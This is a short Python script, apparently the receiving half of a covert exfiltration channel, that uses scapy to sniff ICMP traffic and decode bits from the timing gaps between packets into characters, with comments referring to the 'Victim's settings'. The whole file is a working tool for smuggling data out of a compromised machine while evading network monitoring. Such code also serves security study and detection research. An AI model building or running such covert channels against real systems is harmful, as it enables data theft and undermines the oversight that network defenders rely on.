from scapy.all import sniff, IP, ICMP
import time

# --- CONFIGURATION ---
# MUST match the Victim's settings
DOT_LIMIT  = 0.2  # Below 0.2s = '0'
DASH_LIMIT = 0.5  # Below 0.5s = '1' (but above 0.2)
# Above 0.5s = End of Character

INTERFACE = "eth0" # Change this if needed (check 'ip a')

# Global variables to track state
last_time = 0
current_binary = ""
received_text = ""

def process_timing_covert_channel(packet):
    global last_time, current_binary, received_text
    
    current_time = time.time()
    
    # Ignore the very first packet (it just starts the clock)
    if last_time == 0:
        last_time = current_time
        return

    # 1. Calculate the SILENCE duration (delta)
    delta = current_time - last_time
    last_time = current_time # Reset clock

    # 2. Decode the silence
    if delta < DOT_LIMIT:
        current_binary += "0"
        print(".", end="", flush=True) # Print dot for visual feedback
    elif delta < DASH_LIMIT:
        current_binary += "1"
        print("-", end="", flush=True) # Print dash for visual feedback
    else:
        # Gap > 0.5s means "End of Character"
        if len(current_binary) == 8:
            # Convert binary '01000001' back to 'A'
            char = chr(int(current_binary, 2))
            received_text += char
            print(f" [Captured: {char}]")
            current_binary = "" # Reset for next char
        else:
            # Noise or incomplete byte
            current_binary = ""

print(f"[*] Listening for Covert ICMP Timing on {INTERFACE}...")
print("[*] Decoding silence... (Dots=. / Dashes=-)")

# Listen only for ICMP packets
sniff(filter="icmp", iface=INTERFACE, prn=process_timing_covert_channel, store=0)
